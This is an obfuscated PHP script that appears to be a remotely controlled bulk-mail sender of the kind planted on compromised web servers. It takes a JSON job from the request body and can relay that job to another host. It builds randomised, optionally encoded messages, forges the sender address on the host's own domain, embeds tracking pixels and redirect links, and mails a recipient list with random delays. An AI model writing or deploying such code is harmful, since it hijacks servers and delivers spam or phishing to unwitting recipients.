<?php
@ini_set('max_execution_time', '3600'); @ini_set('max_input_time', '3600'); @set_time_limit(3600); @date_default_timezone_set('UTC'); @error_reporting(0); @ini_set('display_errors', 0); class Macros { private $values = array(); private $fixed = array(); private $used = array(); private $_keys = array(); public function __get($spc3e84c) { if ($spc3e84c == 'keys') { return array_keys($this->_keys); } } public function Import($spc3e84c, $sp93b097) { if (is_array($sp93b097)) { $this->values[$spc3e84c] = array(); foreach ($sp93b097 as $sp37e7df) { if (!empty($sp37e7df['key'])) { $this->values[$spc3e84c][$sp37e7df['key']] = $sp37e7df['value']; } else { $this->values[$spc3e84c][] = $sp37e7df['value']; } } } else { $this->Assign($spc3e84c, $sp93b097); } } public function Assign($spc3e84c, $sp27af1d) { $this->values[$spc3e84c] = $sp27af1d; } public function Parse($sp8a78e8) { $sp17a0f8 = ''; $sp29cdf1 = 0; while (true) { $spe6c434 = strpos($sp8a78e8, '{', $sp29cdf1); if ($spe6c434 === false) { $sp17a0f8 .= substr($sp8a78e8, $sp29cdf1); break; } $sp17a0f8 .= substr($sp8a78e8, $sp29cdf1, $spe6c434 - $sp29cdf1); $sp29cdf1 = $spe6c434 + 1; $sp933dfd = ''; $spd85b28 = '{'; $sp2d2bf9 = array(); $sp3caac6 = false; $spd6503e = false; $sp61883e = 'var'; while ($sp29cdf1 < strlen($sp8a78e8)) { $spbece59 = substr($sp8a78e8, $sp29cdf1, 1); $spd85b28 .= $spbece59; if ($spbece59 == ',' || $spbece59 == '>' || $spbece59 == '|') { if ($sp61883e == 'alias') { $sp3caac6 = $sp933dfd; } elseif ($sp61883e == 'mod') { $spd6503e = $sp933dfd; } else { $sp2d2bf9[] = $sp933dfd; } $sp933dfd = ''; if ($spbece59 == '>') { $sp61883e = 'alias'; } if ($spbece59 == '|') { $sp61883e = 'mod'; } $sp29cdf1++; continue; } if ($spbece59 == '}') { if ($sp61883e == 'alias') { $sp3caac6 = $sp933dfd; } elseif ($sp61883e == 'mod') { $spd6503e = $sp933dfd; } else { $sp2d2bf9[] = $sp933dfd; } $sp29cdf1++; break; } $sp933dfd .= $spbece59; if (preg_match('/[0-9A-Za-z_\\[\\]\\-\\^!]/', $spbece59) == 0) { $sp29cdf1++; $sp2d2bf9 = array(); break; } $sp29cdf1++; } if (sizeof($sp2d2bf9) == 0) { $sp17a0f8 .= $spd85b28; continue; } $spe774c9 = false; $sp545916 = false; if (preg_match('/^\\^/', $sp2d2bf9[0]) > 0) { $sp2d2bf9[0] = substr($sp2d2bf9[0], 1); $spe774c9 = true; } if (preg_match('/^\\!/', $sp2d2bf9[0]) > 0) { $sp2d2bf9[0] = substr($sp2d2bf9[0], 1); $sp545916 = true; } $sp8d22e2 = false; if (preg_match('/\\[([0-9A-Za-z_]+)\\]/', $sp2d2bf9[0], $sp3ad5fb) > 0) { $sp8d22e2 = $sp3ad5fb[1]; } elseif (preg_match('/\\[([\\d\\-]+)\\]/', $sp2d2bf9[0], $sp3ad5fb) > 0) { $sp8d22e2 = explode('-', $sp3ad5fb[1]); } if ($sp8d22e2 !== false) { $sp2d2bf9[0] = substr($sp2d2bf9[0], 0, strpos($sp2d2bf9[0], '[')); } $this->_keys[$sp2d2bf9[0]] = true; if (empty($this->values[$sp2d2bf9[0]]) && empty($this->fixed[$sp2d2bf9[0]])) { continue; } if ($spe774c9) { unset($this->fixed[$sp2d2bf9[0]]); } if (isset($this->fixed[$sp2d2bf9[0]])) { $spe8d377 = $this->fixed[$sp2d2bf9[0]]; } else { $spe8d377 = ''; $sp507d38 = 1; if (sizeof($sp2d2bf9) == 2) { $sp507d38 = $sp2d2bf9[1]; } if (sizeof($sp2d2bf9) == 3) { $sp507d38 = rand($sp2d2bf9[1], $sp2d2bf9[2]); } for ($sp437207 = 0; $sp437207 < $sp507d38; $sp437207++) { if (is_array($this->values[$sp2d2bf9[0]])) { if (!is_array($this->used[$sp2d2bf9[0]])) { $this->used[$sp2d2bf9[0]] = array(); } if (count($this->used[$sp2d2bf9[0]]) == count($this->values[$sp2d2bf9[0]])) { $this->used[$sp2d2bf9[0]] = array(); } if ($sp8d22e2 !== false && is_scalar($sp8d22e2)) { $spe8d377 .= $this->values[$sp2d2bf9[0]][$sp8d22e2]; $this->used[$sp8d22e2] = true; } else { $sp40bfb0 = array(); if (is_array($sp8d22e2)) { $sp11698f = $sp8d22e2[0]; $spa52fa0 = $sp8d22e2[1]; } else { $sp11698f = 0; $spa52fa0 = count($this->values[$sp2d2bf9[0]]) - 1; } for ($spd07f18 = $sp11698f; $spd07f18 <= $spa52fa0; $spd07f18++) { if ($sp545916 && !empty($this->used[$sp2d2bf9[0]][$spd07f18])) { continue; } $sp40bfb0[] = $spd07f18; } $sp104509 = $sp40bfb0[rand(0, count($sp40bfb0) - 1)]; $this->used[$sp2d2bf9[0]][$sp104509] = true; $spe8d377 .= $this->values[$sp2d2bf9[0]][$sp104509]; } } else { $spe8d377 .= $this->values[$sp2d2bf9[0]]; } } } $spe8d377 = $this->Parse($spe8d377); if ($spd6503e !== false) { for ($sp64ad0b = 0; $sp64ad0b < strlen($spd6503e); $sp64ad0b++) { switch (substr($spd6503e, $sp64ad0b, 1)) { case 'b': $spe8d377 = base64_encode($spe8d377); break; case 'q': $spe8d377 = quoted_printable_encode($spe8d377); break; default: break; } } } if ($spe774c9) { $this->fixed[$sp2d2bf9[0]] = $spe8d377; } if ($sp3caac6 !== false && $sp3caac6 != '') { $this->fixed[$sp3caac6] = $spe8d377; } $sp17a0f8 .= $spe8d377; } return $sp17a0f8; } } $spfc97d8 = file_get_contents('php://input'); $sp284f3c = json_decode($spfc97d8, true); if (empty($sp284f3c['via_proxy'])) { $sp284f3c['via_proxy'] = true; $sp75013d = curl_init($sp284f3c['prefix'] . $sp284f3c['files']['s']); $spc52ed6 = json_encode($sp284f3c); curl_setopt($sp75013d, CURLOPT_CONNECTTIMEOUT, 30); curl_setopt($sp75013d, CURLOPT_TIMEOUT, 600); curl_setopt($sp75013d, CURLOPT_RETURNTRANSFER, true); curl_setopt($sp75013d, CURLOPT_USERAGENT, 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15'); curl_setopt($sp75013d, CURLOPT_REFERER, $spaae393); curl_setopt($sp75013d, CURLOPT_POST, true); curl_setopt($sp75013d, CURLOPT_POSTFIELDS, $spc52ed6); curl_setopt($sp75013d, CURLOPT_HTTPHEADER, array('Content-Type: application/json', 'Content-Length: ' . strlen($spc52ed6))); $sp440249 = curl_exec($sp75013d); echo $sp440249; die; } $sp8edcc1 = $_SERVER['SERVER_ADDR']; $sp5e58b1 = $_SERVER['HTTP_HOST']; $sp5e58b1 = preg_replace('/^www\\./', '', $sp5e58b1); $sp5e0c59 = new Macros(); $sp5e0c59->Assign('server_addr', $sp8edcc1); $sp5e0c59->Assign('server_host', $sp5e58b1); foreach ($sp284f3c['macros'] as $spc3e84c => $sp93b097) { $sp5e0c59->Import($spc3e84c, $sp93b097); } $spd02942 = preg_replace('/^www\\./i', '', $sp5e58b1); $sp0e9986 = $sp5e0c59->Parse('{from_user}@' . $spd02942); $sp5e0c59->Assign('from_email', $sp0e9986); $sp5e0c59->Assign('prefix', $sp284f3c['prefix']); $sp5e0c59->Assign('html', $sp284f3c['letter']['html']); $sp29cdf1 = 0; $spb457b1 = 0; $sp9be164 = 0; $sp4e47ff = array(); foreach ($sp284f3c['rcpt'] as $spf1488a) { $sp5e0c59->Assign('email', $spf1488a['email']); $sp5e0c59->Assign('entry', $spf1488a); $sp5e0c59->Assign('date', date('r')); $sp5e0c59->Assign('redirect', $sp284f3c['prefix'] . $sp284f3c['files']['r']); $sp5e0c59->Assign('redirect_with_uri', $sp284f3c['prefix'] . $sp284f3c['files']['r'] . '?uri='); $sp5e0c59->Assign('unsubscribe', $sp284f3c['prefix'] . $sp284f3c['files']['u'] . '?id=' . $spf1488a['id']); $sp5e0c59->Assign('delivery', '<img src="' . $sp284f3c['prefix'] . $sp284f3c['files']['d'] . '?id=' . $spf1488a['id'] . '" />'); $sp175be4 = $sp5e0c59->Parse($sp284f3c['envelope']['header']); $sp168891 = $sp5e0c59->Parse($sp284f3c['envelope']['body']); if (!empty($spf1488a['name'])) { $sp673f3b = $spf1488a['name'] . ' <' . $spf1488a['email'] . '>'; } else { $sp673f3b = $spf1488a['email']; } $sp80b0fd = $sp5e0c59->Parse($sp284f3c['letter']['subject']); if ($sp29cdf1 > 0) { sleep(rand(3, 8)); } $sp94ee13 = mail($sp673f3b, $sp80b0fd, $sp168891, $sp175be4); $sp4e47ff[$spf1488a['id']] = $sp94ee13; if ($sp94ee13) { $spb457b1++; } else { $sp9be164++; } $sp29cdf1++; } echo serialize(array('total' => count($sp284f3c['rcpt']), 'sent' => $sp29cdf1, 'success' => $spb457b1, 'error' => $sp9be164, 'rcpt' => $sp4e47ff));